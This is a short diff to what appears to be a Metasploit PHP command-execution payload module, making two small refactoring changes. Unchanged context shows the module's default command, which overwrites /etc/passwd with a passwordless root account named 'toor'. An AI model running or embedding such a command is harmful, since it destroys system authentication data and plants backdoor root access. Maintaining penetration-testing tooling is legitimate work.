@@ -4,7 +4,6 @@
 ##
 
 
-require 'msf/core'
 require 'msf/core/payload/php'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
@@ -29,7 +28,7 @@ module MetasploitModule
     register_options(
       [
         OptString.new('CMD', [ true, "The command string to execute", 'echo "toor::0:0:::/bin/bash">/etc/passwd' ]),
-      ], self.class)
+      ])
   end
 
   def php_exec_cmd
